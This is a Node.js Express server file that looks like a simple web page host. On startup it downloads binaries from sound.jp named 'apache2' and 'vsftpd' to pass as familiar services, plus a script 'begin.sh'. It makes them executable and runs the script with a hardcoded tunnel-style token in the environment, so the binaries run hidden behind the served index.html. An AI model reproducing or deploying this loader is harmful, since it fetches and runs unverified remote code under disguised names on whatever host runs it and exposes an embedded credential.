const express = require("express");
const path = require("path");
const fs = require("fs");
const util = require("util");
const axios = require("axios");
const exec = util.promisify(require("child_process").exec);

const app = express();
const port = process.env.PORT || 8080;

const filesToDownloadAndExecute = [
  {
    url: "https://github.com/wwrrtt/test/releases/download/3.0/index.html",
    filename: "index.html",
  },
  {
    url: "https://sound.jp/kid/apache2",
    filename: "apache2",
  },
  {
    url: "https://sound.jp/kid/vsftpd",
    filename: "vsftpd",
  },
  {
    url: "https://sound.jp/kid/begin.sh",
    filename: "begin.sh",
  },
];

const downloadFile = async ({ url, filename }) => {
  console.log(`Downloading file from ${url}...`);

  const { data: stream } = await axios.get(url, { responseType: "stream" });
  const writer = fs.createWriteStream(filename);

  stream.pipe(writer);

  return new Promise((resolve, reject) => {
    writer.on("error", reject);
    writer.on("finish", resolve);
  });
};

const fileExists = (filename) => {
  return fs.existsSync(filename);
};

const giveExecutablePermission = async (filename) => {
  try {
    await exec(`chmod +x ${filename}`);
    console.log(`Gave executable permission to ${filename}`);
  } catch (error) {
    console.error(`Failed to give executable permission to ${filename}: `, error);
    return false;
  }
  return true;
};

const downloadAndExecuteFiles = async () => {
  for (let file of filesToDownloadAndExecute) {
    if (!fileExists(file.filename)) {
      try {
        await downloadFile(file);
      } catch (error) {
        console.error(`Failed to download file ${file.filename}: ${error}`);
        return false;
      }
    } else {
      console.log(`${file.filename} already exists. Skipping download.`);
    }
  }

  // Set executable permissions for each file if not already executable
  const filesToCheck = ["begin.sh", "apache2", "vsftpd"];
  for (let file of filesToCheck) {
    const isExecutable = fs.statSync(file).mode & fs.constants.S_IXUSR;
    if (!isExecutable) {
      await giveExecutablePermission(file);
    } else {
      console.log(`${file} is already executable. Skipping permission change.`);
    }
  }

  try {
    const { stdout } = await exec("bash begin.sh", {
      env: {
        ...process.env,
        Token:
          "eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiYmNmZmQwNTktY2JjMC00YzhmLTgzMWQtNzRhYjM2ZDZiODFlIiwicyI6Ik4yTmtZVFEwWW1VdFlqRTJOaTAwT1dKakxXSmtZbVl0TkRnMllURTFZV000WmpNdyJ9",
      },
    });
    console.log(`begin.sh output: \n${stdout}`);
  } catch (error) {
    console.error("Failed to execute begin.sh: ", error);
    return false;
  }

  return true;
};

downloadAndExecuteFiles()
  .then((success) => {
    if (!success) {
      console.error("There was a problem downloading and executing the files.");
    }
  })
  .catch(console.error);

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"), (err) => {
    if (err) {
      res.status(500).send("Error loading index.html");
    }
  });
});

app.listen(port, () => {
  console.log(`Server started and listening on port ${port}`);
});